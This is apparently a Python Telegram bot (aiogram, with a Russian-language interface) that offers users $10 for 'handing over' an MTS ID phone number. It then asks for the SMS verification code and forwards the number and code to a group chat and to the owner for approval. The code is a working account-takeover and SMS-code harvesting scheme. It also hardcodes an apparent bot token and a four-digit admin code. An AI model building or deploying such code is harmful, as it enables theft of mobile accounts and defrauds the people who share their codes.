import asyncio
import json
import os
from datetime import datetime
from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton,
    InlineKeyboardMarkup, InlineKeyboardButton
)
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder

# ==================== НАСТРОЙКИ ====================
BOT_TOKEN = "8680765862:AAFX3BG6hTz1A9MXLqAVHqbyutJtJ9g7W8s"
OWNER_ID = 8874871486
GROUP_ID = -5448015222
SUPPORT_USERNAME = "@Sm_mts"
ADMIN_CODE = "0408"
DB_FILE = "database.json"

# ==================== БАЗА ДАННЫХ ====================
def load_db():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {
        "users": {},
        "tickets": {},  # ticket_id -> {user_id, phone}
        "bot_running": True,
        "buttons": {
            "btn1": "📱 Сдать MTS ID",
            "btn2": "👤 Профиль",
            "btn3": "🆘 Поддержка"
        },
        "descriptions": {
            "btn1": "Сдать номер MTS ID и получить $10",
            "btn2": "Ваш профиль и баланс",
            "btn3": "Связаться с поддержкой"
        },
        "colors": {
            "btn1": "", "btn2": "", "btn3": ""
        },
        "photos": {
            "btn1": "", "btn2": "", "btn3": ""
        }
    }

def save_db():
    with open(DB_FILE, "w", encoding="utf-8") as f:
        json.dump(db, f, ensure_ascii=False, indent=2)

db = load_db()

def get_user(uid):
    uid = str(uid)
    if uid not in db["users"]:
        db["users"][uid] = {
            "balance": 0.0,
            "mts_count": 0,
            "joined": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "username": ""
        }
        save_db()
    return db["users"][uid]

# ==================== FSM СОСТОЯНИЯ ====================
class UserStates(StatesGroup):
    phone = State()
    code = State()
    withdraw_sum = State()

class AdminStates(StatesGroup):
    waiting_code = State()
    menu = State()
    edit_btn_name = State()
    edit_btn_desc = State()
    edit_btn_color = State()
    edit_btn_photo = State()
    broadcast = State()

# ==================== ИНИЦИАЛИЗАЦИЯ ====================
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
router = Router()
dp.include_router(router)

pending = {}  # ticket_id -> {user_id, phone, code}

# ==================== КЛАВИАТУРЫ ====================
def main_menu():
    kb = ReplyKeyboardBuilder()
    kb.button(text=db["buttons"]["btn1"])
    kb.button(text=db["buttons"]["btn2"])
    kb.button(text=db["buttons"]["btn3"])
    kb.adjust(3)
    return kb.as_markup(resize_keyboard=True)

def admin_menu():
    kb = InlineKeyboardBuilder()
    kb.button(text="✏️ Изменить название кнопок", callback_data="adm_name")
    kb.button(text="📝 Изменить описание кнопок", callback_data="adm_desc")
    kb.button(text="🎨 Изменить цвет кнопок", callback_data="adm_color")
    kb.button(text="🖼 Изменить фото кнопок", callback_data="adm_photo")
    if db["bot_running"]:
        kb.button(text="⏸ Остановить бота", callback_data="adm_stop")
    else:
        kb.button(text="▶️ Запустить бота", callback_data="adm_start")
    kb.button(text="📢 Рассылка объявления", callback_data="adm_broadcast")
    kb.button(text="📊 Статистика", callback_data="adm_stats")
    kb.adjust(2)
    return kb.as_markup()

# ==================== СТАРТ ====================
@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    if not db["bot_running"] and message.from_user.id != OWNER_ID:
        await message.answer("⛔ Бот временно остановлен. Попробуйте позже.")
        return
    u = get_user(message.from_user.id)
    u["username"] = message.from_user.username or ""
    save_db()
    await state.clear()
    await message.answer(
        f"👋 Добро пожаловать!\n\n"
        f"{db['descriptions']['btn1']}\n"
        f"{db['descriptions']['btn2']}\n"
        f"{db['descriptions']['btn3']}",
        reply_markup=main_menu()
    )

# ==================== КНОПКА 1: СДАТЬ MTS ID ====================
@router.message(F.text == db["buttons"]["btn1"])
async def btn1_handler(message: Message, state: FSMContext):
    if not db["bot_running"] and message.from_user.id != OWNER_ID:
        await message.answer("⛔ Бот временно остановлен.")
        return
    await state.set_state(UserStates.phone)
    await message.answer(
        "📱 Отправьте номер телефона MTS.\n\n"
        "Примеры:\n+79999999999\n89999999999\n9999999999",
        reply_markup=ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text="❌ Отмена")]],
            resize_keyboard=True
        )
    )

@router.message(UserStates.phone)
async def process_phone(message: Message, state: FSMContext):
    if message.text == "❌ Отмена":
        await state.clear()
        await message.answer("Отменено.", reply_markup=main_menu())
        return

    phone = message.text.strip().replace(" ", "").replace("-", "")
    clean = phone.lstrip("+")
    if not (clean.isdigit() and len(clean) in (10, 11)):
        await message.answer("❌ Неверный формат номера. Попробуйте снова:")
        return

    await state.update_data(phone=phone)
    await state.set_state(UserStates.code)

    # Сохраняем тикет
    ticket_id = f"{message.from_user.id}_{int(datetime.now().timestamp())}"
    pending[ticket_id] = {
        "user_id": message.from_user.id,
        "phone": phone,
        "code": None,
        "username": message.from_user.username or str(message.from_user.id)
    }
    db["tickets"][ticket_id] = {"user_id": message.from_user.id, "phone": phone}
    save_db()
    await state.update_data(ticket_id=ticket_id)

    # Отправляем в группу
    try:
        await bot.send_message(
            GROUP_ID,
            f"📥 Новый номер MTS\n"
            f"👤 User: @{message.from_user.username or message.from_user.id}\n"
            f"🆔 ID: {message.from_user.id}\n"
            f"📞 Номер: {phone}"
        )
    except Exception as e:
        print(f"Ошибка отправки в группу: {e}")

    await message.answer("✅ Номер принят. Теперь отправьте код из SMS:")

@router.message(UserStates.code)
async def process_code(message: Message, state: FSMContext):
    code = message.text.strip()
    data = await state.get_data()
    phone = data.get("phone")
    ticket_id = data.get("ticket_id")
    await state.clear()

    # Отправляем код в группу
    try:
        await bot.send_message(
            GROUP_ID,
            f"🔐 Код получен\n"
            f"👤 @{message.from_user.username or message.from_user.id}\n"
            f"📞 Номер: {phone}\n"
            f"🔑 Код: {code}"
        )
    except Exception as e:
        print(f"Ошибка: {e}")

    await message.answer(
        "⏳ Ожидайте проверки номера.",
        reply_markup=main_menu()
    )

    # Отправляем владельцу
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="✅ Да", callback_data=f"approve_{ticket_id}"),
        InlineKeyboardButton(text="❌ Нет", callback_data=f"reject_{ticket_id}")
    ]])
    try:
        await bot.send_message(
            OWNER_ID,
            f"🆕 Новая заявка\n"
            f"👤 @{message.from_user.username or message.from_user.id}\n"
            f"🆔 {message.from_user.id}\n"
            f"📞 Номер: {phone}\n"
            f"🔑 Код: {code}",
            reply_markup=kb
        )
    except Exception as e:
        print(f"Ошибка владельцу: {e}")

# ==================== ОДОБРЕНИЕ/ОТКАЗ ====================
@router.callback_query(F.data.startswith("approve_"))
async def approve(call: CallbackQuery):
    if call.from_user.id != OWNER_ID:
        await call.answer("Нет доступа", show_alert=True)
        return
    ticket_id = call.data.split("_", 1)[1]
    ticket = db["tickets"].get(ticket_id) or pending.get(ticket_id)
    if not ticket:
        await call.answer("Тикет не найден", show_alert=True)
        return
    uid = ticket["user_id"]
    u = get_user(uid)
    u["balance"] += 10.0
    u["mts_count"] += 1
    save_db()
    try:
        await bot.send_message(uid, f"✅ Номер одобрен! На баланс зачислено $10.\n💰 Баланс: ${u['balance']:.2f}")
    except: pass
    await call.message.edit_text(call.message.text + "\n\n✅ ОДОБРЕНО")
    await call.answer("Зачислено")

@router.callback_query(F.data.startswith("reject_"))
async def reject(call: CallbackQuery):
    if call.from_user.id != OWNER_ID:
        await call.answer("Нет доступа", show_alert=True)
        return
    ticket_id = call.data.split("_", 1)[1]
    ticket = db["tickets"].get(ticket_id) or pending.get(ticket_id)
    if not ticket:
        await call.answer("Тикет не найден", show_alert=True)
        return
    uid = ticket["user_id"]
    try:
        await bot.send_message(uid, "❌ Произошла ошибка. Попробуйте позже.")
    except: pass
    await call.message.edit_text(call.message.text + "\n\n❌ ОТКЛОНЕНО")
    await call.answer("Отклонено")

# ==================== КНОПКА 2: ПРОФИЛЬ ====================
@router.message(F.text == db["buttons"]["btn2"])
async def btn2_handler(message: Message):
    if not db["bot_running"] and message.from_user.id != OWNER_ID:
        await message.answer("⛔ Бот остановлен.")
        return
    u = get_user(message.from_user.id)
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="💸 Вывести", callback_data="withdraw")
    ]])
    await message.answer(
        f"👤 <b>Ваш профиль</b>\n\n"
        f"💰 Баланс: <b>${u['balance']:.2f}</b>\n"
        f"📱 Сдано MTS: <b>{u['mts_count']}</b>\n"
        f"📅 Зарегистрирован: {u['joined']}",
        parse_mode="HTML",
        reply_markup=kb
    )

@router.callback_query(F.data == "withdraw")
async def withdraw_start(call: CallbackQuery, state: FSMContext):
    await state.set_state(UserStates.withdraw_sum)
    await call.message.answer("💵 Введите сумму для вывода (в $):")
    await call.answer()

@router.message(UserStates.withdraw_sum)
async def withdraw_sum(message: Message, state: FSMContext):
    try:
        amount = float(message.text.replace(",", ".").strip())
        if amount <= 0:
            raise ValueError
    except:
        await message.answer("❌ Неверная сумма. Введите число:")
        return

    u = get_user(message.from_user.id)
    if u["balance"] < amount:
        await state.clear()
        await message.answer(
            f"❌ Недостаточно средств.\nВаш баланс: ${u['balance']:.2f}",
            reply_markup=main_menu()
        )
        return

    u["balance"] -= amount
    save_db()
    await state.clear()
    await message.answer(
        f"⏳ Ожидайте вывод ${amount:.2f}",
        reply_markup=main_menu()
    )
    try:
        await bot.send_message(
            OWNER_ID,
            f"💸 Заявка на вывод\n"
            f"👤 @{message.from_user.username or message.from_user.id}\n"
            f"🆔 {message.from_user.id}\n"
            f"💰 Сумма: ${amount:.2f}"
        )
    except: pass

# ==================== КНОПКА 3: ПОДДЕРЖКА ====================
@router.message(F.text == db["buttons"]["btn3"])
async def btn3_handler(message: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="🆘 Написать в поддержку", url=f"https://t.me/{SUPPORT_USERNAME.lstrip('@')}")
    ]])
    await message.answer(
        f"👋 Чтобы написать в поддержку, нажмите на кнопку ниже.\n\n"
        f"Контакт: {SUPPORT_USERNAME}",
        reply_markup=kb
    )

# ==================== АДМИН ПАНЕЛЬ ====================
@router.message(Command("admin"))
async def admin_cmd(message: Message, state: FSMContext):
    if message.from_user.id != OWNER_ID:
        await message.answer("⛔ Нет доступа")
        return
    await state.set_state(AdminStates.waiting_code)
    await message.answer("🔐 Введите код администратора:")

@router.message(AdminStates.waiting_code)
async def admin_check_code(message: Message, state: FSMContext):
    if message.text.strip() != ADMIN_CODE:
        await message.answer("❌ Неверный код")
        await state.clear()
        return
    await state.set_state(AdminStates.menu)
    await message.answer("🔧 <b>Админ-панель</b>", parse_mode="HTML", reply_markup=admin_menu())

@router.callback_query(F.data == "adm_stats")
async def adm_stats(call: CallbackQuery):
    if call.from_user.id != OWNER_ID: return
    total_users = len(db["users"])
    total_balance = sum(u["balance"] for u in db["users"].values())
    total_mts = sum(u["mts_count"] for u in db["users"].values())
    text = (
        f"📊 <b>Статистика</b>\n\n"
        f"👥 Пользователей: <b>{total_users}</b>\n"
        f"📱 Всего сдано MTS: <b>{total_mts}</b>\n"
        f"💰 Общий баланс: <b>${total_balance:.2f}</b>\n"
        f"⚙️ Статус бота: {'🟢 работает' if db['bot_running'] else '🔴 остановлен'}"
    )
    await call.message.edit_text(text, parse_mode="HTML", reply_markup=admin_menu())
    await call.answer()

@router.callback_query(F.data == "adm_stop")
async def adm_stop(call: CallbackQuery):
    if call.from_user.id != OWNER_ID: return
    db["bot_running"] = False
    save_db()
    await call.message.edit_text("⏸ Бот остановлен", reply_markup=admin_menu())
    await call.answer()

@router.callback_query(F.data == "adm_start")
async def adm_start(call: CallbackQuery):
    if call.from_user.id != OWNER_ID: return
    db["bot_running"] = True
    save_db()
    await call.message.edit_text("▶️ Бот запущен", reply_markup=admin_menu())
    await call.answer()

@router.callback_query(F.data == "adm_broadcast")
async def adm_broadcast_start(call: CallbackQuery, state: FSMContext):
    if call.from_user.id != OWNER_ID: return
    await state.set_state(AdminStates.broadcast)
    await call.message.answer("📢 Введите текст объявления:")
    await call.answer()

@router.message(AdminStates.broadcast)
async def adm_broadcast_send(message: Message, state: FSMContext):
    await state.clear()
    sent = 0
    failed = 0
    for uid in db["users"].keys():
        try:
            await bot.send_message(int(uid), f"📢 <b>Объявление</b>\n\n{message.text}", parse_mode="HTML")
            sent += 1
        except:
            failed += 1
        await asyncio.sleep(0.05)
    await message.answer(f"✅ Отправлено: {sent}\n❌ Ошибок: {failed}")

# Редактирование кнопок
@router.callback_query(F.data == "adm_name")
async def adm_name(call: CallbackQuery, state: FSMContext):
    if call.from_user.id != OWNER_ID: return
    await state.set_state(AdminStates.edit_btn_name)
    await call.message.answer(
        "Введите в формате:\n<code>1 Новое название</code>\n"
        "1 — сдать, 2 — профиль, 3 — поддержка",
        parse_mode="HTML"
    )
    await call.answer()

@router.message(AdminStates.edit_btn_name)
async def save_name(message: Message, state: FSMContext):
    await state.clear()
    try:
        parts = message.text.split(" ", 1)
        n = parts[0]; val = parts[1]
        db["buttons"][f"btn{n}"] = val
        save_db()
        await message.answer(f"✅ Кнопка {n} обновлена.\nПользователи увидят новую клавиатуру после /start")
    except:
        await message.answer("❌ Неверный формат")

@router.callback_query(F.data == "adm_desc")
async def adm_desc(call: CallbackQuery, state: FSMContext):
    if call.from_user.id != OWNER_ID: return
    await state.set_state(AdminStates.edit_btn_desc)
    await call.message.answer("Введите: <code>1 Новое описание</code>", parse_mode="HTML")
    await call.answer()

@router.message(AdminStates.edit_btn_desc)
async def save_desc(message: Message, state: FSMContext):
    await state.clear()
    try:
        parts = message.text.split(" ", 1)
        n = parts[0]; val = parts[1]
        db["descriptions"][f"btn{n}"] = val
        save_db()
        await message.answer("✅ Описание обновлено")
    except:
        await message.answer("❌ Неверный формат")

@router.callback_query(F.data == "adm_color")
async def adm_color(call: CallbackQuery, state: FSMContext):
    if call.from_user.id != OWNER_ID: return
    await state.set_state(AdminStates.edit_btn_color)
    await call.message.answer("Введите: <code>1 #FF0000</code> (номер кнопки и HEX-цвет)", parse_mode="HTML")
    await call.answer()

@router.message(AdminStates.edit_btn_color)
async def save_color(message: Message, state: FSMContext):
    await state.clear()
    try:
        parts = message.text.split(" ", 1)
        n = parts[0]; val = parts[1]
        db["colors"][f"btn{n}"] = val
        save_db()
        await message.answer("✅ Цвет сохранён (для inline-кнопок в будущих версиях)")
    except:
        await message.answer("❌ Неверный формат")

@router.callback_query(F.data == "adm_photo")
async def adm_photo(call: CallbackQuery, state: FSMContext):
    if call.from_user.id != OWNER_ID: return
    await state.set_state(AdminStates.edit_btn_photo)
    await call.message.answer(
        "Отправьте фото (или URL) с подписью-командой:\n"
        "Пример: подпись к фото <code>1</code> для кнопки 1",
        parse_mode="HTML"
    )
    await call.answer()

@router.message(AdminStates.edit_btn_photo, F.photo)
async def save_photo(message: Message, state: FSMContext):
    await state.clear()
    try:
        n = message.caption.strip()
        file_id = message.photo[-1].file_id
        db["photos"][f"btn{n}"] = file_id
        save_db()
        await message.answer(f"✅ Фото для кнопки {n} сохранено")
    except:
        await message.answer("❌ Неверный формат (нужна подпись с номером кнопки)")

# ==================== ЗАПУСК ====================
async def main():
    print("Бот запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
